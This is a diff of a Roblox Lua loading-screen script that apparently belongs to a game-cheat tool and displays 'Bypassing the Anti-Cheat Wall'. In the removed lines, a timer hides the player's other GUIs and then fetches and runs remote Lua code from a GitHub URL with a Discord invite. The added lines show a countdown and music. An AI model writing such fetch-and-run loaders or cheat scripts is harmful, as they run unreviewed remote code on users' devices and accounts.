@@ -4,26 +4,16 @@ local TweenService = game:GetService("TweenService")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- Hide all other GUIs except the loading GUI
-local guiNameToKeep = "LoadingScreen"
-for _, gui in ipairs(playerGui:GetChildren()) do
-	if gui:IsA("ScreenGui") and gui.Name ~= guiNameToKeep then
-		gui.Enabled = false
-	end
-end
-
--- 🌈 Create Loading GUI
 local loadingGui = Instance.new("ScreenGui")
-loadingGui.Name = guiNameToKeep
+loadingGui.Name = "LoadingScreen"
 loadingGui.ResetOnSpawn = false
 loadingGui.IgnoreGuiInset = true
 loadingGui.Parent = playerGui
 
--- Background Frame
+-- Background
 local bg = Instance.new("Frame", loadingGui)
 bg.Size = UDim2.new(1, 0, 1, 0)
 bg.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-
 local gradient = Instance.new("UIGradient", bg)
 gradient.Color = ColorSequence.new{
 	ColorSequenceKeypoint.new(0, Color3.fromRGB(102, 126, 234)),
@@ -35,9 +25,9 @@ local avatar = Instance.new("ImageLabel", bg)
 avatar.Size = UDim2.new(0, 80, 0, 80)
 avatar.Position = UDim2.new(0, 20, 0, 20)
 avatar.BackgroundTransparency = 1
-avatar.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png" -- fallback
+avatar.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
 
--- Load actual avatar
+-- Load avatar
 coroutine.wrap(function()
 	local success, img = pcall(function()
 		return Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
@@ -57,7 +47,7 @@ nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 nameLabel.TextStrokeTransparency = 0.7
 nameLabel.TextXAlignment = Enum.TextXAlignment.Left
 
--- Title (Typewriter)
+-- Title animation
 local title = Instance.new("TextLabel", bg)
 title.Text = ""
 title.Size = UDim2.new(0.8, 0, 0, 60)
@@ -69,7 +59,15 @@ title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.TextStrokeTransparency = 0.8
 title.TextXAlignment = Enum.TextXAlignment.Center
 
--- Status Glow
+local fullText = "🚧 Bypassing the Anti-Cheat Wall... 🚧"
+coroutine.wrap(function()
+	for i = 1, #fullText do
+		title.Text = string.sub(fullText, 1, i)
+		wait(0.05)
+	end
+end)()
+
+-- Status Text
 local status = Instance.new("TextLabel", bg)
 status.Text = "🌼 Loading... Please wait. 🌼"
 status.Size = UDim2.new(0.8, 0, 0, 40)
@@ -81,31 +79,34 @@ status.TextColor3 = Color3.fromRGB(255, 255, 255)
 status.TextStrokeTransparency = 0.6
 status.TextXAlignment = Enum.TextXAlignment.Center
 
--- Animate text color
+-- ⏱ Countdown Timer (Top Right)
+local countdownLabel = Instance.new("TextLabel", bg)
+countdownLabel.Size = UDim2.new(0, 160, 0, 36)
+countdownLabel.Position = UDim2.new(1, -180, 0, 20)
+countdownLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+countdownLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+countdownLabel.Font = Enum.Font.GothamBold
+countdownLabel.TextSize = 20
+countdownLabel.TextXAlignment = Enum.TextXAlignment.Center
+countdownLabel.TextYAlignment = Enum.TextYAlignment.Center
+countdownLabel.Text = "Time Left: 2:00"
+countdownLabel.BackgroundTransparency = 0.2
+countdownLabel.BorderSizePixel = 0
+
+local corner = Instance.new("UICorner", countdownLabel)
+corner.CornerRadius = UDim.new(0, 8)
+
 coroutine.wrap(function()
-	while status.Parent do
-		local tween1 = TweenService:Create(status, TweenInfo.new(1), { TextColor3 = Color3.fromRGB(255, 255, 180) })
-		local tween2 = TweenService:Create(status, TweenInfo.new(1), { TextColor3 = Color3.fromRGB(255, 255, 255) })
-		tween1:Play()
-		tween1.Completed:Wait()
-		tween2:Play()
-		tween2.Completed:Wait()
+	for i = 120, 0, -1 do
+		local min = math.floor(i / 60)
+		local sec = i % 60
+		countdownLabel.Text = string.format("Time Left: %d:%02d", min, sec)
+		wait(1)
 	end
+	countdownLabel.Visible = false
 end)()
 
--- Typewriter effect
-local fullText = "🚧 Bypassing the Anti-Cheat Wall... 🚧"
-coroutine.wrap(function()
-	for i = 1, #fullText do
-		title.Text = string.sub(fullText, 1, i)
-		wait(0.05)
-	end
-end)()
-
--- Launch pet GUI after 2 minutes
-task.delay(120, function()
-	if loadingGui then loadingGui:Destroy() end
-	pcall(function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
-	end)
-end)
+-- 🎵 Background Music
+local sound = Instance.new("Sound", loadingGui)
+sound.SoundId = "rbxassetid://1841861443"
+sound.Volume
